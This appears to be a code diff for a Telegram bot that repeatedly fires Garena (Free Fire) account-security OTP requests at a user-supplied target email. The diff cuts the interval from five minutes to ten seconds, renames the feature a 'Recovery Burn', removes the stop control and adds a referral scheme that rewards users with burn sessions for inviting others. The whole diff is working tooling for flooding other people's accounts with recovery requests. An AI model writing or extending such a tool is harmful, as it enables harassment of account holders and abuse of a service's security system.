@@ -20,7 +20,7 @@ INIT_URL = "https://100067.connect.garena.com/game/account_security/"
 ALGIERS_TZ = ZoneInfo("Africa/Algiers")
 START_TIME = time(4, 0, 0)
 END_TIME = time(6, 0, 0)
-INTERVAL_SECONDS = 300
+INTERVAL_SECONDS = 10
 
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
@@ -32,6 +32,13 @@ is_running = False
 active_chat_id = None
 scheduler_task = None
 waiting_for_email_input = False
+
+# Referral & Credits System
+user_referrals = {}    # {user_id: count}
+referred_by = {}       # {user_id: referrer_id}
+user_burn_credits = {} # {user_id: credits_count}
+
+REQUIRED_REFERRALS_PER_BURN = 5
 
 def execute_garena_request(email: str) -> tuple[bool, str]:
     session = requests.Session()
@@ -67,15 +74,9 @@ def execute_garena_request(email: str) -> tuple[bool, str]:
 
 def build_main_menu() -> InlineKeyboardMarkup:
     keyboard = [
-        [InlineKeyboardButton("📧 Set Target Email", callback_data="btn_set_email")],
-        [
-            InlineKeyboardButton("🚀 Start Automation (04:00 AM)", callback_data="btn_start_auto"),
-            InlineKeyboardButton("🛑 Stop Automation", callback_data="btn_stop_auto")
-        ],
-        [
-            InlineKeyboardButton("⚡ Send One OTP Now", callback_data="btn_send_now"),
-            InlineKeyboardButton("📊 Check Status", callback_data="btn_status")
-        ]
+        [InlineKeyboardButton("➕ Add Email", callback_data="btn_add_email")],
+        [InlineKeyboardButton("🔥 Start Recovery Burn (04:00 AM)", callback_data="btn_start_burn")],
+        [InlineKeyboardButton("👥 Referral System", callback_data="btn_referral")]
     ]
     return InlineKeyboardMarkup(keyboard)
 
@@ -110,7 +111,7 @@ async def scheduled_dispatcher_loop(context: ContextTypes.DEFAULT_TYPE):
                     f"✅ **OTP Sent Successfully!**\n"
                     f"📧 Email: `{target_email}`\n"
                     f"🕒 Time: `{timestamp}` (Algeria Time)\n"
-                    f"⏱️ Next attempt in 5 minutes."
+                    f"⏱️ Next attempt in 10 seconds."
                 )
             else:
                 msg = (
@@ -118,7 +119,7 @@ async def scheduled_dispatcher_loop(context: ContextTypes.DEFAULT_TYPE):
                     f"📧 Email: `{target_email}`\n"
                     f"🕒 Time: `{timestamp}` (Algeria Time)\n"
                     f"⚠️ Details: `{details}`\n"
-                    f"🔄 Retrying in 5 minutes."
+                    f"🔄 Retrying in 10 seconds."
                 )
             await send_telegram_alert(context, msg)
             await asyncio.sleep(INTERVAL_SECONDS)
@@ -130,15 +131,36 @@ async def scheduled_dispatcher_loop(context: ContextTypes.DEFAULT_TYPE):
             is_running = False
             break
         else:
-            await asyncio.sleep(30)
+            await asyncio.sleep(10)
 
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global active_chat_id
     active_chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+    
+    if context.args:
+        referrer_id_str = context.args[0]
+        if referrer_id_str.isdigit():
+            referrer_id = int(referrer_id_str)
+            if referrer_id != user_id and user_id not in referred_by:
+                referred_by[user_id] = referrer_id
+                user_referrals[referrer_id] = user_referrals.get(referrer_id, 0) + 1
+                
+                # Check if referrer reached 5 invites to earn 1 burn credit
+                if user_referrals[referrer_id] % REQUIRED_REFERRALS_PER_BURN == 0:
+                    user_burn_credits[referrer_id] = user_burn_credits.get(referrer_id, 0) + 1
+                    try:
+                        await context.bot.send_message(
+                            chat_id=referrer_id,
+                            text=f"🎉 **Congratulations!** You invited 5 new users!\n🔥 You unlocked 1 Recovery Burn session."
+                        )
+                    except Exception as err:
+                        logging.error(f"Failed to notify referrer: {err}")
+
     welcome_text = (
         "⚙️ **Free Fire Automated OTP Dispatcher**\n\n"
         "• **Schedule:** Every day from 04:00 AM to 06:00 AM (Algeria Time)\n"
-        "• **Interval:** Every 5 minutes\n\n"
+        "• **Interval:** Every 10 seconds\n\n"
         "Use the interactive buttons below to control the bot:"
     )
     await update.message.reply_text(
@@ -152,22 +174,39 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     active_chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
 
-    if query.data == "btn_set_email":
+    if query.data == "btn_add_email":
         waiting_for_email_input = True
         await query.edit_message_text(
             "📩 Please send the target email address in a message now:",
             parse_mode="Markdown"
         )
 
-    elif query.data == "btn_start_auto":
+    elif query.data == "btn_start_burn":
         if not target_email:
             await query.edit_message_text(
-                "❌ **No target email set!** Please click 'Set Target Email' first.",
+                "❌ **No target email set!** Please click '➕ Add Email' first.",
                 reply_markup=build_main_menu(),
                 parse_mode="Markdown"
             )
             return
+            
+        credits = user_burn_credits.get(user_id, 0)
+        if credits <= 0:
+            total_refs = user_referrals.get(user_id, 0)
+            needed = REQUIRED_REFERRALS_PER_BURN - (total_refs % REQUIRED_REFERRALS_PER_BURN)
+            await query.edit_message_text(
+                f"⚠️ **Access Denied! You do not have enough Recovery Burn Credits.**\n\n"
+                f"• Every **5 referrals** = **1 Recovery Burn Session**\n"
+                f"• Current Referrals: `{total_refs}`\n"
+                f"• Referrals needed: `{needed}` more\n\n"
+                f"Share your link via '👥 Referral System' to earn credits!",
+                reply_markup=build_main_menu(),
+                parse_mode="Markdown"
+            )
+            return
+
         if is_running:
             await query.edit_message_text(
                 "⚠️ **Automation is already running!**",
@@ -175,69 +214,39 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode="Markdown"
             )
             return
+
+        # Deduct 1 credit for starting the burn session
+        user_burn_credits[user_id] -= 1
         is_running = True
         scheduler_task = asyncio.create_task(scheduled_dispatcher_loop(context))
         await query.edit_message_text(
             f"🚀 **Automation Scheduled!**\n"
             f"📧 Target: `{target_email}`\n"
             f"🕒 Active Window: 04:00 AM - 06:00 AM (Algeria Time)\n"
-            f"⏱️ Interval: Every 5 minutes",
+            f"⏱️ Interval: Every 10 seconds\n"
+            f"🎫 Remaining Burn Credits: `{user_burn_credits[user_id]}`",
             reply_markup=build_main_menu(),
             parse_mode="Markdown"
         )
 
-    elif query.data == "btn_stop_auto":
-        if not is_running:
-            await query.edit_message_text(
-                "⚠️ **Automation is not active.**",
-                reply_markup=build_main_menu(),
-                parse_mode="Markdown"
-            )
-            return
-        is_running = False
-        if scheduler_task:
-            scheduler_task.cancel()
-            scheduler_task = None
-        await query.edit_message_text(
-            "🛑 **Automation stopped successfully.**",
-            reply_markup=build_main_menu(),
-            parse_mode="Markdown"
-        )
-
-    elif query.data == "btn_send_now":
-        if not target_email:
-            await query.edit_message_text(
-                "❌ **No target email set!** Please set an email first.",
-                reply_markup=build_main_menu(),
-                parse_mode="Markdown"
-            )
-            return
-        await query.edit_message_text("⏳ Processing manual OTP request...")
-        success, details = await asyncio.to_thread(execute_garena_request, target_email)
-        if success:
-            res_msg = f"✅ **Instant OTP Sent!**\n`{details}`"
-        else:
-            res_msg = f"❌ **Manual Request Failed!**\n`{details}`"
-        await context.bot.send_message(
-            chat_id=active_chat_id,
-            text=res_msg,
-            reply_markup=build_main_menu(),
-            parse_mode="Markdown"
-        )
-
-    elif query.data == "btn_status":
-        now_algiers = datetime.now(ALGIERS_TZ).strftime("%Y-%m-%d %H:%M:%S")
-        status_str = "Scheduled / Running 🟢" if is_running else "Stopped 🔴"
-        email_str = target_email if target_email else "Not set"
-        msg = (
-            f"📊 **Bot Status Summary**\n\n"
-            f"• **Status:** {status_str}\n"
-            f"• **Target Email:** `{email_str}`\n"
-            f"• **Time Window:** 04:00 AM - 06:00 AM\n"
-            f"• **Current Algeria Time:** `{now_algiers}`"
+    elif query.data == "btn_referral":
+        bot_username = (await context.bot.get_me()).username
+        referral_link = f"https://t.me/{bot_username}?start={user_id}"
+        total_refs = user_referrals.get(user_id, 0)
+        credits = user_burn_credits.get(user_id, 0)
+        progress = total_refs % REQUIRED_REFERRALS_PER_BURN
+        
+        ref_text = (
+            f"👥 **Referral System**\n\n"
+            f"Share your referral link with your friends to invite them:\n"
+            f"🔗 `{referral_link}`\n\n"
+            f"📊 **Your Stats:**\n"
+            f"• Total Invites: `{total_refs}` user(s)\n"
+            f"• Progress: `{progress}/{REQUIRED_REFERRALS_PER_BURN}` to next credit\n"
+            f"• Available Burn Credits: `{credits}` session(s)"
         )
         await query.edit_message_text(
-            msg,
+            ref_text,
             reply_markup=build_main_menu(),
             parse_mode="Markdown"
         )
